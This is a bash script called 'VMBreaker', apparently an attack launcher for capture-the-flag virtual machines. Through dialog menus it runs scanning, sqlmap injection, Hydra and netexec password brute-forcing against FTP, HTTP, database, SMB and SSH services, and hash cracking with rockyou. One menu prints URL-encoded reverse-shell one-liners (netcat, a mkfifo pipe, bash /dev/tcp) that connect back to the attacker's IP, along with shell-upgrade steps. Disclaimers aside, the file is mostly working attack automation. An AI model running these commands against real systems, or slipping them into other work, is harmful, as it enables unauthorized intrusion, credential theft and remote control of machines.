#!/bin/bash
# Kerszi and ChatGPT 4.0
# This is a program for basic operations to break into a virtual machine.

# Please note that "VMBreaker" is primarily designed for educational and research purposes
# in the context of virtual machine security analysis. It is a powerful tool that can potentially be used to 
# bypass virtual machine protections. However, I, as the creator or distributor, assume 
# no responsibility for any damage, loss, or legal consequences that may arise from its use. 
# Users are urged to apply "VMBreaker" responsibly and ethically, strictly adhering to all applicable 
# laws and regulations. Its use in unauthorized or malicious activities is strongly discouraged and condemned. 
# By using "VMBreaker," you agree to use it solely for legitimate purposes and bear full responsibility for your actions and their consequences.

# Additionally, "VMBreaker" is released under the GNU General Public License (GPL). This means that it is free software,
# and you are welcome to redistribute it and/or modify it under the terms of the GNU GPL as published by the Free Software Foundation,
# either version 3 of the License, or (at your option) any later version.
# "VMBreaker" is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# You should have received a copy of the GNU General Public License along with "VMBreaker."
# If not, see <http://www.gnu.org/licenses/>.

# "VMBreaker" is a specialized tool designed with a focused approach, aiming not to be an all-in-one solution but rather
# to provide the essential functionalities required for virtual machine security testing and analysis. The philosophy behind
# "VMBreaker" is to maintain simplicity and efficiency, offering users a concise set of tools that are directly applicable to
# breaking through virtual machine protections. By avoiding the complexity of a multi-purpose toolkit, "VMBreaker" ensures
# that its users have a straightforward, user-friendly experience, enabling them to focus on the critical aspects of virtual
# machine penetration testing. This approach allows for a deeper understanding of the vulnerabilities and security mechanisms
# specific to virtual machines, making "VMBreaker" an invaluable asset for both educational purposes and professional security
# assessments.
# Always ensure you have authorization before connecting to any system
# Greets to:
# HackMyVM, Sekurak, 大傻子的小圈子 

NAMEPROGRAM="VMBreaker (by Kerszi/MindCrafters)"
DATE="2024-04-03"
VERSION="0.38a3"
DESCRIPTION="This is a program for basic operations to break into a virtual machine."
# Main variables - if you need before export like: export VARIABLE
# IP=""
# DICTIONARY=""
# PATH_SUFFIX="" #start with /
# FILE=""
# USERNAME=""
EXTENSIONS="htm,html,jpg,php,txt"

# Check programs
programs=(
  binwalk
  dirsearch
  exiftool
  feroxbuster  
  ffuf
  file
  hashcat
  haiti
  hydra
  john
  nc
  netdiscover
  netexec
  nikto
  nmap
  sqlmap
  stegoveritas
  stegseek
  wapiti
  whatweb
  wpscan
  zsteg
)

get_first_up_interface_ip() {
    # Find the first up interface, excluding lo (loopback)
    local interface=$(ip link show | grep -B1 'state UP' | grep -v 'lo:' | grep -vE '^\s' | cut -d':' -f2 | awk '{print $1}' | head -n 1)

    if [ -z "$interface" ]; then
        echo "No active interface found."
        return 1
    fi

    # Get the IP address of the found interface
    local ip=$(ip addr show $interface | grep -oP 'inet \K[\d.]+')

    if [ -z "$ip" ]; then
        echo "IP address not found for interface $interface."
        return 1
    fi

    echo "$ip"
}

# Colors
print_color() {
  if [ "$1" = "0" ]; then
    echo -e "\033[32m$2: installed\033[0m"
  else
    echo -e "\033[31m$2: not installed\033[0m"
  fi
}

# Check every programs
check_programs () {
for program in "${programs[@]}"; do
  if command -v "$program" &> /dev/null; then
    print_color 0 "$program"
  else
    print_color 1 "$program"
  fi
done
}

show_help() {
  echo "$NAMEPROGRAM version $VERSION"
  echo "$DESCRIPTION"
  echo ""
  echo "Usage: $0 [options]"
  echo ""
  echo "Options:"
  echo "  -c                show required programs"
  echo "  -h, --help        show this help message"
  echo "  -v                show variable exported values"
  echo "  -vv               display detailed information about exported variable values (verbose mode)"
  echo ""
  echo "Example:"
  echo "  $0 -v             display the values of variables"
}


show_variables() {
    echo "$NAMEPROGRAM version $VERSION"
    echo -e "\033[0;32mIP:\033[0m          $IP"
    echo -e "\033[0;32mHTTPPORT:\033[0m    $HTTPPORT"        
    echo -e "\033[0;32mDICTIONARY:\033[0m  $DICTIONARY"
    echo -e "\033[0;32mPATH_SUFFIX:\033[0m $PATH_SUFFIX"
    echo -e "\033[0;32mFILE:\033[0m        $FILE"
    echo -e "\033[0;32mUSERNAME:\033[0m    $USERNAME"
    echo -e "\033[0;32mHC_HASH:\033[0m     $HC_HASH"
    echo -e "\033[0;32mJTR_HASH:\033[0m    $JTR_HASH"
    echo -e "\033[0;32mLPORT:\033[0m       $LPORT"
}

show_verbose_variables() {
    echo "$NAMEPROGRAM version $VERSION"
    if [[ -z "$IP" ]]; then    
        echo -e "\033[0;32mIP:\033[0m          IP address or network to scan, useful when searching for a virtual machine."
    else
        echo -e "\033[0;32mIP:\033[0m          $IP"
    fi

    if [[ -z "$HTTPPORT" ]]; then
        echo -e "\033[0;32mHTTPPORT:\033[0m    HTTP port to scan."
    else
        echo -e "\033[0;32mHTTPPORT:\033[0m    $HTTPPORT"
    fi

    if [[ -z "$DICTIONARY" ]]; then
        echo -e "\033[0;32mDICTIONARY:\033[0m  Dictionary for scanning purposes."
    else
        echo -e "\033[0;32mDICTIONARY:\033[0m  $DICTIONARY"
    fi

    if [[ -z "$PATH_SUFFIX" ]]; then
        echo -e "\033[0;32mPATH_SUFFIX:\033[0m Path suffix for the website."
    else
        echo -e "\033[0;32mPATH_SUFFIX:\033[0m $PATH_SUFFIX"
    fi

    if [[ -z "$FILE" ]]; then
        echo -e "\033[0;32mFILE:\033[0m        File to analyze."
    else
        echo -e "\033[0;32mFILE:\033[0m        $FILE"
    fi

    if [[ -z "$USERNAME" ]]; then
        echo -e "\033[0;32mUSERNAME:\033[0m    Username for scanning the website."
    else
        echo -e "\033[0;32mUSERNAME:\033[0m    $USERNAME"
    fi

    if [[ -z "$HC_HASH" ]]; then
        echo -e "\033[0;32mHC_HASH:\033[0m     Hashcat hash - a hash also get by the program."
    else
        echo -e "\033[0;32mHC_HASH:\033[0m     $HC_HASH"
    fi

    if [[ -z "$JTR_HASH" ]]; then
        echo -e "\033[0;32mJTR_HASH:\033[0m    John the Ripper hash - a hash also get by the program."
    else
        echo -e "\033[0;32mJTR_HASH:\033[0m    $JTR_HASH"
    fi

    if [[ -z "$LPORT" ]]; then
        echo -e "\033[0;32mLPORT:\033[0m       Listening port for reverse shell."
    else
        echo -e "\033[0;32mLPORT:\033[0m       $LPORT"
    fi    
}


while [[ "$#" -gt 0 ]]; do
    case $1 in
        -h|--help) show_help; exit 0 ;;
        -v) show_variables; exit 0 ;;
        -vv) show_verbose_variables; exit 0 ;;
        -c) check_programs; exit 0 ;;        
        *) echo "Unknown option: $1"; exit 1 ;;
    esac
    shift
done


# Check if the IP environment variable is set
if [ -z "${IP+x}" ]; then
    echo "The 'IP' variable is not exported or is empty."
    echo "Example for IP      : export IP=127.0.0.1"    
    echo "Example for NETWORK : export IP=192.168.0.0"    
    exit 1
fi


if [ ! -z "${PATH_SUFFIX+x}" ]; then

    if [[ ! "${PATH_SUFFIX}" =~ ^/.+/$ ]]; then 
        echo "PATH_SUFFIX must start with '/' and with '/' or be empty."
        exit 1
    fi  

else
    PATH_SUFFIX='/'
fi

if [ -z "${HTTPPORT+x}" ]; then
    HTTPPORT=80
fi

if [ -z "${HC_HASH+x}" ]; then
    HC_HASH=0
fi

if [ -z "${JTR_HASH+x}" ]; then
    JTR_HASH="raw-md5"
fi

# Check if 'dialog' is installed
if ! command -v dialog &> /dev/null; then
    echo "The 'dialog' program is not installed."
    echo "Try apt install dialog (Debian)"
    exit 1
fi

# IP and host information
get_info () {
info="IP:          $IP   HTTPPORT: $HTTPPORT LPORT: $LPORT\nUSERNAME:    $USERNAME   HC_HASH: $HC_HASH JTR_HASH: $JTR_HASH\nDICTIONARY:  $DICTIONARY\nPATH_SUFFIX: $PATH_SUFFIX\nFILE:        $FILE"
}

get_info

# Functions for submenus


submenu1() {
    exec 3>&1
    selection=$(dialog \
        --clear \
        --title "Netdiscover Scan" \
        --menu "Choose an action:" 12 50 1 \
        1 "Start Netdiscover Scan" \
        2>&1 1>&3)    
    exec 3>&- 
    case $selection in
        1)
            IP=$(hostname -I | awk '{print $1}') 
            NETWORK=$(echo $IP | sed 's/\.[0-9]*$/.0/')
            COMMAND="netdiscover -P -r $NETWORK" 
            run_program_green "$COMMAND"
            ;;
    esac
}


submenu2() {
    exec 3>&1
    selection=$(dialog \
        --clear \
        --title "Nmap scan" \
        --menu "Choose an action:" 12 50 1 \
        1 "Start Nmap fast scan" \
        2 "Start Nmap verbose scan" \
        3 "Start Nmap UDP scan" \
        2>&1 1>&3)
    exec 3>&-
    case $selection in
        1)
            COMMAND="nmap $IP"
            run_program_green "$COMMAND"
            ;;
        2)
            COMMAND="nmap -A -p- $IP"
            run_program_green "$COMMAND"
            ;;
        3)
            COMMAND="nmap -sU -p- $IP"
            run_program_green "$COMMAND"
            ;;
    esac
}

submenu3() {
    exec 3>&1
    selection=$(dialog \
        --clear \
        --title "Whatweb Check" \
        --menu "Choose an action:" 12 50 1 \
        1 "Whatweb simply" \
        2 "Whatweb verbose" \
        2>&1 1>&3)
    exec 3>&-
    case $selection in
        1)
            COMMAND="whatweb $IP:$HTTPPORT"
            run_program_green "$COMMAND"
            ;;
        2)
            COMMAND="whatweb -v $IP:$HTTPPORT"
            run_program_green "$COMMAND"
            ;;
    esac
}

submenu4() {
    exec 3>&1
    selection=$(dialog \
        --menu "Choose an action:" 12 50 2 \
        "A" "Dirsearch" \
        "B" "Feroxbuster" \
        "C" "Ffuf (WORDLIST)" \
        "D" "Ffuf (PAR+WORDLIST)" \
        2>&1 1>&3)
case $selection in
    "A")
        clear
        if [ -z "$DICTIONARY" ]; then
            # If DICTIONARY is empty, run dirsearch without -w parameter
            COMMAND="dirsearch -u http://$IP:$HTTPPORT$PATH_SUFFIX"
            run_program_green "$COMMAND"
        else
            # If DICTIONARY contains a path, run dirsearch with -w parameter
            COMMAND="dirsearch -u http://$IP:$HTTPPORT$PATH_SUFFIX -w $DICTIONARY"
            run_program_green "$COMMAND"            
        fi
        exit 0
        ;;
    "B")    
        clear
        if [ -z "$DICTIONARY" ]; then
            # If DICTIONARY is empty, run feroxbuster without -w parameter
            COMMAND="feroxbuster -u http://$IP:$HTTPPORT$PATH_SUFFIX"
            run_program_green "$COMMAND"                        
        else        
            # If DICTIONARY contains a path, run feroxbuster with the -w parameter
            COMMAND="feroxbuster -x $EXTENSIONS -u http://$IP:$HTTPPORT$PATH_SUFFIX -w $DICTIONARY"
            run_program_green "$COMMAND"
        fi
        exit 0
        ;;  
    "C")    
        if [[ -z "${DICTIONARY}" ]]; then  
           dialog --title "Error" --msgbox "The variable DICTIONARY cannot be empty." 10 50; 
           else 
            COMMAND='ffuf -H "Content-Type: application/x-www-form-urlencoded" -w '"$DICTIONARY"':PARAM -d "username=PARAM" -u http://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"' -ac'
            run_program_green_no_exit "$COMMAND"
            ffuf -H "Content-Type: application/x-www-form-urlencoded" -w "$DICTIONARY":PARAM -d "username=PARAM" -u http://$IP:$HTTPPORT$PATH_SUFFIX
            exit            
           fi
        ;;
    "D")    
        if [[ -z "${USERNAME}" || -z "${DICTIONARY}" ]]; then  
           dialog --title "Error" --msgbox "The variables USERNAME and DICTIONARY cannot be empty." 10 50; 
           else 
            COMMAND='ffuf -H "Content-Type: application/x-www-form-urlencoded" -w '"$DICTIONARY"':PARAM -d "username='"$USERNAME"'&password=PARAM" -b "cookie here" -u http://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"' -ac'
            run_program_green_no_exit "$COMMAND"
            ffuf -H "Content-Type: application/x-www-form-urlencoded" -w $DICTIONARY:PARAM -d "username=$USERNAME&password=PARAM" -b "cookie here" -u http://$IP:$HTTPPORT$PATH_SUFFIX
            exit            
           fi
        ;;
esac
}

submenu5() {
    exec 3>&1
    selection=$(dialog \
        --menu "Choose an action:" 12 50 6 \
        "A" "Nikto" \
        "B" "Wapiti" \
        "C" "Wpscan (aggressive)" \
        "D" "Sqlmap (all)" \
        "E" "Sqlmap (REQUESTFILE)" \
        2>&1 1>&3)
    case $selection in
        "A")
            # Here you can add some action for Option A
            COMMAND="nikto -h http://$IP:$HTTPPORT$PATH_SUFFIX"
            run_program_green "$COMMAND"
            ;;
        "B")
            COMMAND="docker run --rm cyberwatch/wapiti --color --url http://$IP:$HTTPPORT$PATH_SUFFIX"
            run_program_green "$COMMAND"
            ;;
        "C")
            COMMAND="wpscan --enumerate --plugins-detection aggressive -t 50 u,vp, vt --url http://$IP:$HTTPPORT$PATH_SUFFIX"
            run_program_green "$COMMAND"
            ;;
        "D")
            COMMAND="sqlmap -u http://$IP:$HTTPPORT$PATH_SUFFIX -a --batch --level 3 --risk 1 --forms --dbms=mysql --text-only --exclude-sysdb --threads 10"
            run_program_green "$COMMAND"
            ;;
        "E")
        if [[ -z "${FILE+x}" ]]; then  
           dialog --title "Error" --msgbox "The variable FILE cannot be empty.\n\
export FILE=[Name of file]" 10 50; 
        else
            COMMAND="sqlmap -r $FILE --threads 10 --batch --dbs"                        
            run_program_green "$COMMAND"
        fi
            ;;                        
    esac
}

submenu6() {
    exec 3>&1
    selection=$(dialog \
        --menu "Choose an action:" 14 50 7 \
        "A" "Hydra - ftp" \
        "B" "Hydra - http-get" \
        "C" "Hydra - http-post" \
        "D" "Hydra - mysql" \
        "E" "Hydra - postgres" \
        "F" "Netexec - samba" \
        "G" "Hydra - ssh" \
        2>&1 1>&3)
    case $selection in
        "A")            
            COMMAND="hydra -V -I -l $USERNAME -P $DICTIONARY ftp://$IP$PATH_SUFFIX"
            run_program_green "$COMMAND"
            ;;
        "B")            
            COMMAND='hydra -V -I -l '"$USERNAME"' -P '"$DICTIONARY"' "http-get://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"'login.php:username=^USER^&password=^PASS^:F=login Failed"'
            run_program_green_no_exit "$COMMAND"
            hydra -V -I -l "$USERNAME" -P "$DICTIONARY" "http-get://$IP:$HTTPPORT$PATH_SUFFIX/login.php:username=^USER^&password=^PASS^:F=login Failed"
            exit
            ;;      
        "C")
            COMMAND='hydra -V -I -l '"$USERNAME"' -P '"$DICTIONARY"' "http-form-post://'"$IP"':'"$HTTPPORT"''"$PATH_SUFFIX"'login.php:username=^USER^&password=^PASS^:F=login Failed"'
            run_program_green_no_exit "$COMMAND"
            hydra -V -I -l "$USERNAME" -P "$DICTIONARY" "http-form-post://$IP:$HTTPPORT$PATH_SUFFIX/login.php:username=^USER^&password=^PASS^:F=login Failed"
            exit
            ;;
        "D")    
            COMMAND="hydra -V -I -l $USERNAME -P $DICTIONARY mysql://$IP$PATH_SUFFIX" 
            run_program_green "$COMMAND"
            ;;
        "E")
            COMMAND="hydra -V -I -l $USERNAME -P $DICTIONARY postgres://$IP$PATH_SUFFIX" 
            run_program_green "$COMMAND"
            ;;
        "F")
            COMMAND="netexec smb $IP -u $USERNAME -p $DICTIONARY --shares --sessions --users --groups --computers " 
            run_program_green "$COMMAND"
            ;;
        "G")
            COMMAND="hydra -V -I -l $USERNAME -P $DICTIONARY ssh://$IP$PATH_SUFFIX" 
            run_program_green "$COMMAND"
            ;;
    esac
}

submenu7() {
    
    exec 3>&1
    selection=$(dialog \
        --menu "Choose an action:" 12 50 4 \
        "A" "HAITI (run and exit)" \
        "B" "HAITI (get hash)" \
        "C" "John the Ripper" \
        "D" "HashCat" \
        2>&1 1>&3)
    case $selection in
        "A")
            # Here you can add some action for Option A
            COMMAND="haiti $(cat $FILE)"  
            run_program_green "$COMMAND"
            ;;
        "B")
            TMP_VALUE=""
            TMP_VALUE=$(haiti --no-color --hashcat-only $(cat $FILE) |head -1| sed -n 's/.*\[HC: \(.*\)\]/\1/p')
    
            if [ ! -z "${TMP_VALUE}" ]; then
            HC_HASH=$TMP_VALUE
            get_info;
            else
            HC_HASH="none"
            get_info;
            fi

            TMP_VALUE=$(haiti --no-color --john-only $(cat $FILE) |head -1| sed -n 's/.*\[JtR: \(.*\)\]/\1/p')

            if [ ! -z "${TMP_VALUE}" ]; then
            JTR_HASH=$TMP_VALUE
            get_info;
            else
            JTR_HASH="none"
            get_info;
            fi
            ;;
        "C")
            COMMAND="john --format=$JTR_HASH --wordlist=$DICTIONARY $FILE"
            run_program_green "$COMMAND"
            ;;
        "D")
            COMMAND="hashcat -O -a0 -m $HC_HASH $FILE $DICTIONARY" #change to your attack
            run_program_green "$COMMAND"            
            ;;
    esac
}




submenu8() {
    exec 3>&1
    selection=$(dialog \
        --menu "Choose an action:" 13 50 3 \
        "A" "File" \
        "B" "Exiftool (all)" \
        "C" "Binwalk" \
        "D" "Stegseek (jpg)" \
        "E" "Zsteg (png)" \
        "F" "Stegoveritas (all)" \
        2>&1 1>&3)
    case $selection in
        "A")
            # Here you can add some action for Option A
            COMMAND="file $FILE"
            run_program_green "$COMMAND"
            ;;
        "B")
            COMMAND="exiftool $FILE" 
            run_program_green "$COMMAND"
            ;;             
        "C")
            COMMAND="binwalk $FILE" 
            run_program_green "$COMMAND"
            ;;             
        "D")
            COMMAND="stegseek $FILE"
            run_program_green "$COMMAND"
            ;;
        "E")
            COMMAND="zsteg -a $FILE" 
            run_program_green "$COMMAND"
            ;;
        "F")
            COMMAND="stegoveritas $FILE" 
            run_program_green "$COMMAND"
            ;;             

    esac
}

submenu9() {
    LOCALIP=$(get_first_up_interface_ip)
    exec 3>&1
    selection=$(dialog \
        --menu "Choose an action for Reverse Shell:" 12 50 3 \
        "1" "Start reverse shell listener" \
        "2" "Enhance reverse shell session" \
        "3" "Popular reverse shell connections" \
        2>&1 1>&3)

    case $selection in
        "1")
            COMMAND="nc -lvp $LPORT"
            run_program_green "$COMMAND"                                                
            ;;
        "2")
            clear
            echo -e "To enhance the reverse shell session, follow these steps:"
            echo -e "\e[90m# 1. Start a script session with a null device and bash:\e[0m"
            echo -e "\e[32m   script /dev/null -c bash\e[0m"
            echo -e "\e[90m# 2. Export the TERM variable as xterm:\e[0m"
            echo -e "\e[32m   export TERM=xterm\e[0m"
            echo -e "\e[90m# 3. Suspend the process (after initiating the reverse shell) by pressing \e[32mCtrl+Z\e[90m.\e[0m"
            echo -e "\e[90m# 4. Set the terminal to raw mode and disable echo, then foreground the process:\e[0m"
            echo -e "\e[32m   stty raw -echo; fg\e[0m"
            echo  
            echo -e "\e[90m# 5. Reset the terminal emulation to xterm:\e[0m"
            echo -e "\e[32m   reset xterm\e[0m"
            echo -e "\e[90m# 6. Adjust terminal rows and columns:\e[0m"
            echo -e "\e[32m   stty rows 44 columns 185\e[0m"
            echo -e "\e[90m# 7. Source the bashrc file to get a fully functional bash environment:\e[0m"
            echo -e "\e[32m   source /etc/skel/.bashrc\e[0m"
            echo -e "\e[90m# 8. Export SHELL environment variable as bash:\e[0m"
            echo -e "\e[32m   export SHELL=bash\e[0m"
            echo 
            echo -e "\e[90m# To restore control over the console after exiting, type:\e[0m"
            echo -e "\e[32m   stty sane\e[0m"            
            exit 0
            ;;
        "3")
            clear                    
            FIRSTEXAMPLE="nc -c bash $LOCALIP $LPORT"
            FIRSTEXAMPLEENCODED=$(urlencode "$FIRSTEXAMPLE")
            echo "1. Netcat (Traditional) Reverse Shell:"
            echo -e "\e[90mUses netcat with the -c option to execute bash on the connected system.\e[0m"
            echo -e "\e[32m$FIRSTEXAMPLE\e[0m"            
            echo -e "\e[32m$FIRSTEXAMPLEENCODED\e[0m"            
            echo ""

            echo "2. Netcat (OpenBSD) with Named Pipe:"
            SECONDEXAMPLE="rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc $LOCALIP $LPORT >/tmp/f"
            SECONDEXAMPLEENCODED=$(urlencode "$SECONDEXAMPLE")
            echo -e "\e[90mCreates a FIFO pipe and uses it to execute a shell, redirecting input and output through netcat.\e[0m"
            echo -e "\e[32m$SECONDEXAMPLE\e[0m"
            echo -e "\e[32m$SECONDEXAMPLEENCODED\e[0m"
            echo ""

            echo "3. Bash TCP Reverse Shell:"
            THIRDEXAMPLE="bash -i >& /dev/tcp/$LOCALIP/$LPORT 0>&1"
            THIRDEXAMPLEENCODED=$(urlencode "$THIRDEXAMPLE")
            echo -e "\e[90mUtilizes bash to create a reverse shell that connects back to a specified IP and port over TCP.\e[0m"
            echo -e "\e[32m$THIRDEXAMPLE\e[0m"
            echo -e "\e[32m$THIRDEXAMPLEENCODED\e[0m"
            echo ""
            echo -e "\e[90mNote: Always ensure you have authorization before connecting to any system.\e[0m"
            exit 0
            ;;
        *)
            echo "Invalid selection. Exiting."
            ;;
    esac
}

submenuA() {
    exec 3>&1
    selection=$(dialog --backtitle "Submenu 1" \
                       --title "Dictionary selection" \
                       --menu "Choose one dictionary:" 13 50 5 \
                       "1" "None" \
                       "2" "Rockyou.txt" \
                       "3" "10-million-password-list-top-10000.txt" \
                       "4" "directory-list-2.3-medium.txt" \
                       "5" "LFI-gracefulsecurity-linux.txt" \
                       "6" "quick-SQLi.txt" \
                       2>&1 1>&3)
    case $selection in
        1) unset DICTIONARY;;
        2) DICTIONARY="/usr/share/wordlists/rockyou.txt";;         
        3) DICTIONARY="/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt";; 
        4) DICTIONARY="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt";;        
        5) DICTIONARY="/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt";;
        6) DICTIONARY="/usr/share/wordlists/seclists/Fuzzing/SQLi/quick-SQLi.txt";;

    esac
        DICTIONARY_=$(basename "$DICTIONARY")
        get_info
}


urlencode() {
    local length="${#1}"
    for (( i = 0; i < length; i++ )); do
        local c="${1:i:1}"
        case $c in
            [a-zA-Z0-9.~_-]) printf "$c" ;;
            *) printf '%%%02X' "'$c" ;;
        esac
    done
}



run_program_green() {
    COMMAND=$1
    clear   
    echo -e "\033[32mrunning COMMAND\033[0m: $COMMAND"
    $COMMAND
    exit 0
}
run_program_green_no_exit() {
# The problem occurs when there are too many quotation marks.
    COMMAND=$1
    clear
    echo -e "\033[32mrunning COMMAND\033[0m: $COMMAND"     
}


# Main program loop
while true; do
    exec 3>&1
    selection=$(dialog \
        --backtitle "$NAMEPROGRAM $VERSION" \
        --title "" \
        --clear \
        --cancel-label "Exit" \
        --menu "$info" 21 60 10 \
        "1" "IP search tool" \
        "2" "Port Scan tool" \
        "3" "HTTP info tool" \
        "4" "HTTP Scanning (DIR)" \
        "5" "Vulnerability Search" \
        "6" "Cracking Service" \
        "7" "Cracking Hash" \
        "8" "Steg" \
        "9" "Reverse Shell" \
        "A" "Dictionaries" \
        2>&1 1>&3)
    case $selection in
        1) submenu1 ;;
        2) submenu2 ;;
        3) submenu3 ;;
        4) submenu4 ;;
        5) submenu5 ;;
        6) if [[ -z "${USERNAME+x}" || -z "${DICTIONARY+x}" ]]; then  
           dialog --title "Error" --msgbox "The variables USERNAME and DICTIONARY cannot be empty.\n\
export USERNAME=[Name of user]\nexport DICTIONARY=[Name of dictionary] or\n\
chose Dictionaries" 10 50; 
           else submenu6
           fi
           ;;
        7) if [[ -z "${FILE+x}" || -z "${DICTIONARY+x}" ]]; then  
           dialog --title "Error" --msgbox "The variables FILE and DICTIONARY cannot be empty.\n\
export FILE=[Name of file]\nexport DICTIONARY=[Name of dictionary] or\n\
chose Dictionaries" 10 50; 
           else submenu7
           fi
           ;; 
        8) if [ -z "${FILE+x}" ]; then
           dialog --title "Error" --msgbox "The variable FILE cannot be empty.\n\
export FILE=[Name of file]" 10 50; 
           else submenu8;
           fi
           ;; 
        9) 
           if [ -z "${LPORT+x}" ]; then           
           dialog --title "Error" --msgbox "The variable LPORT cannot be empty.\n\
export LPORT=[Listen Port]" 10 50; 
           else
           submenu9
           fi
           ;;
        A) submenuA ;;
        *)
            clear
            exit 0
            ;;
    esac
done
